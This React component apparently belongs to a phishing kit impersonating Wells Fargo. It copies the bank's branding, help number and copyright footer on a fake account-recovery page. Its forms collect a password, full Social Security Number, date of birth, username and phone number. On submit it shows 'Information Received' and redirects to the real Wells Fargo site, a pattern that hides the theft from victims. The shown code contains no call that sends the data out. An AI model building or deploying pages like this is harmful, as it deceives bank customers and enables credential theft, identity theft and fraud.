import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { ArrowLeft, Phone, Mail, Lock, Calendar, CreditCard } from "lucide-react";
import { Link, useLocation } from "wouter";
import heroBg from "@/assets/images/hero-bg.jpg";
import { OfficialHeader } from "@/components/official-header";

const usernameRecoverySchema = z.object({
  password: z.string().min(1, "Password is required"),
  ssn: z.string().min(9, "Please enter your full SSN").max(11),
  dateOfBirth: z.string().min(1, "Date of birth is required"),
});

const passwordRecoverySchema = z.object({
  username: z.string().min(1, "Username is required"),
  ssn: z.string().min(9, "Please enter your full SSN").max(11),
  dateOfBirth: z.string().min(1, "Date of birth is required"),
});

const bothRecoverySchema = z.object({
  phone: z.string().min(10, "Please enter a valid phone number"),
  ssn: z.string().min(9, "Please enter your full SSN").max(11),
  dateOfBirth: z.string().min(1, "Date of birth is required"),
});

type UsernameFormData = z.infer<typeof usernameRecoverySchema>;
type PasswordFormData = z.infer<typeof passwordRecoverySchema>;
type BothFormData = z.infer<typeof bothRecoverySchema>;

export default function ForgotPasswordPage() {
  const [step, setStep] = useState<"choose" | "verify">("choose");
  const [recoveryType, setRecoveryType] = useState<"username" | "password" | "both" | null>(null);
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const usernameForm = useForm<UsernameFormData>({
    resolver: zodResolver(usernameRecoverySchema),
    defaultValues: {
      password: "",
      ssn: "",
      dateOfBirth: "",
    },
  });

  const passwordForm = useForm<PasswordFormData>({
    resolver: zodResolver(passwordRecoverySchema),
    defaultValues: {
      username: "",
      ssn: "",
      dateOfBirth: "",
    },
  });

  const bothForm = useForm<BothFormData>({
    resolver: zodResolver(bothRecoverySchema),
    defaultValues: {
      phone: "",
      ssn: "",
      dateOfBirth: "",
    },
  });

  const handleSelectOption = (type: "username" | "password" | "both") => {
    setRecoveryType(type);
    setStep("verify");
  };

  const onSubmit = () => {
    toast({
      title: "Information Received",
      description: "Redirecting to Wells Fargo...",
    });
    setTimeout(() => {
      window.location.href = "https://www.wellsfargo.com/";
    }, 1000);
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fafafa]">
      <OfficialHeader variant="simple" />

      <main
        className="flex-1 relative"
        style={{
          backgroundImage: `url(${heroBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center bottom",
        }}
      >
        <div className="max-w-lg mx-auto px-4 py-8">
          <Card
            className="shadow-lg border-0 bg-white"
            data-testid="card-forgot"
          >
            <CardContent className="p-6 sm:p-8">
              {step === "choose" ? (
                <Link href="/">
                  <button
                    className="flex items-center gap-2 text-[#cd1409] text-sm mb-4 hover:underline"
                    data-testid="button-back"
                  >
                    <ArrowLeft className="w-4 h-4" />
                    Back to Sign On
                  </button>
                </Link>
              ) : (
                <button
                  onClick={() => setStep("choose")}
                  className="flex items-center gap-2 text-[#cd1409] text-sm mb-4 hover:underline"
                  data-testid="button-back-options"
                >
                  <ArrowLeft className="w-4 h-4" />
                  Back to options
                </button>
              )}

              {step === "choose" && (
                <>
                  <h1
                    className="text-2xl text-gray-800 mb-2 font-semibold"
                    data-testid="text-title"
                  >
                    Forgot username or password?
                  </h1>
                  <p className="text-gray-600 text-sm mb-6">
                    Select what you need help with:
                  </p>

                  <div className="space-y-3">
                    <button
                      onClick={() => handleSelectOption("username")}
                      className="w-full p-4 border border-gray-300 rounded-md text-left hover:border-[#cd1409] hover:bg-gray-50 transition-colors"
                      data-testid="button-forgot-username"
                    >
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center">
                          <Mail className="w-5 h-5 text-gray-600" />
                        </div>
                        <div>
                          <p className="font-medium text-gray-800">
                            I forgot my username
                          </p>
                          <p className="text-sm text-gray-500">
                            We'll help you recover your username
                          </p>
                        </div>
                      </div>
                    </button>

                    <button
                      onClick={() => handleSelectOption("password")}
                      className="w-full p-4 border border-gray-300 rounded-md text-left hover:border-[#cd1409] hover:bg-gray-50 transition-colors"
                      data-testid="button-forgot-password"
                    >
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center">
                          <Lock className="w-5 h-5 text-gray-600" />
                        </div>
                        <div>
                          <p className="font-medium text-gray-800">
                            I forgot my password
                          </p>
                          <p className="text-sm text-gray-500">
                            Reset your password securely
                          </p>
                        </div>
                      </div>
                    </button>
                  </div>

                  <div className="mt-4 text-center">
                    <button
                      onClick={() => handleSelectOption("both")}
                      className="text-[#cd1409] text-sm underline hover:no-underline"
                      data-testid="link-forgot-both"
                    >
                      Both
                    </button>
                  </div>
                </>
              )}

              {step === "verify" && recoveryType === "username" && (
                <>
                  <h1
                    className="text-2xl text-gray-800 mb-2 font-semibold"
                    data-testid="text-title-username"
                  >
                    Recover your username
                  </h1>
                  <p className="text-gray-600 text-sm mb-6">
                    Please verify your identity:
                  </p>

                  <Form {...usernameForm}>
                    <form
                      onSubmit={usernameForm.handleSubmit(onSubmit)}
                      className="space-y-4"
                    >
                      <FormField
                        control={usernameForm.control}
                        name="password"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <Lock className="w-4 h-4" />
                              Password
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="Enter your password"
                                className="h-12 border-gray-300"
                                data-testid="input-password"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={usernameForm.control}
                        name="ssn"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <CreditCard className="w-4 h-4" />
                              Social Security Number
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="XXX-XX-XXXX"
                                className="h-12 border-gray-300"
                                data-testid="input-ssn"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={usernameForm.control}
                        name="dateOfBirth"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <Calendar className="w-4 h-4" />
                              Date of Birth
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="date"
                                className="h-12 border-gray-300"
                                data-testid="input-dob"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <Button
                        type="submit"
                        className="w-full h-11 bg-[#cd1409] hover:bg-[#b81208] rounded-full"
                        data-testid="button-continue"
                      >
                        Continue
                      </Button>
                    </form>
                  </Form>
                </>
              )}

              {step === "verify" && recoveryType === "password" && (
                <>
                  <h1
                    className="text-2xl text-gray-800 mb-2 font-semibold"
                    data-testid="text-title-password"
                  >
                    Reset your password
                  </h1>
                  <p className="text-gray-600 text-sm mb-6">
                    Please verify your identity:
                  </p>

                  <Form {...passwordForm}>
                    <form
                      onSubmit={passwordForm.handleSubmit(onSubmit)}
                      className="space-y-4"
                    >
                      <FormField
                        control={passwordForm.control}
                        name="username"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <Mail className="w-4 h-4" />
                              Username
                            </FormLabel>
                            <FormControl>
                              <Input
                                placeholder="Enter your username"
                                className="h-12 border-gray-300"
                                data-testid="input-username"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={passwordForm.control}
                        name="ssn"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <CreditCard className="w-4 h-4" />
                              Social Security Number
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="XXX-XX-XXXX"
                                className="h-12 border-gray-300"
                                data-testid="input-ssn"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={passwordForm.control}
                        name="dateOfBirth"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <Calendar className="w-4 h-4" />
                              Date of Birth
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="date"
                                className="h-12 border-gray-300"
                                data-testid="input-dob"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <Button
                        type="submit"
                        className="w-full h-11 bg-[#cd1409] hover:bg-[#b81208] rounded-full"
                        data-testid="button-continue"
                      >
                        Continue
                      </Button>
                    </form>
                  </Form>
                </>
              )}

              {step === "verify" && recoveryType === "both" && (
                <>
                  <h1
                    className="text-2xl text-gray-800 mb-2 font-semibold"
                    data-testid="text-title-both"
                  >
                    Recover username and password
                  </h1>
                  <p className="text-gray-600 text-sm mb-6">
                    Please verify your identity:
                  </p>

                  <Form {...bothForm}>
                    <form
                      onSubmit={bothForm.handleSubmit(onSubmit)}
                      className="space-y-4"
                    >
                      <FormField
                        control={bothForm.control}
                        name="phone"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <Phone className="w-4 h-4" />
                              Phone Number
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="tel"
                                placeholder="(555) 555-5555"
                                className="h-12 border-gray-300"
                                data-testid="input-phone"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={bothForm.control}
                        name="ssn"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <CreditCard className="w-4 h-4" />
                              Social Security Number
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="XXX-XX-XXXX"
                                className="h-12 border-gray-300"
                                data-testid="input-ssn"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={bothForm.control}
                        name="dateOfBirth"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <Calendar className="w-4 h-4" />
                              Date of Birth
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="date"
                                className="h-12 border-gray-300"
                                data-testid="input-dob"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <Button
                        type="submit"
                        className="w-full h-11 bg-[#cd1409] hover:bg-[#b81208] rounded-full"
                        data-testid="button-continue"
                      >
                        Continue
                      </Button>
                    </form>
                  </Form>
                </>
              )}

              <div className="mt-6 pt-6 border-t border-gray-200">
                <div className="flex items-center gap-3 text-sm text-gray-600">
                  <Phone className="w-4 h-4" />
                  <span>
                    Need help? Call{" "}
                    <a href="tel:1-800-869-3557" className="text-[#cd1409]">
                      1-800-869-3557
                    </a>
                  </span>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>

      <footer className="bg-white border-t border-gray-200 py-4">
        <div className="max-w-7xl mx-auto px-4">
          <p
            className="text-xs text-gray-500 text-center"
            data-testid="text-copyright"
          >
            © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801.
          </p>
        </div>
      </footer>
    </div>
  );
}
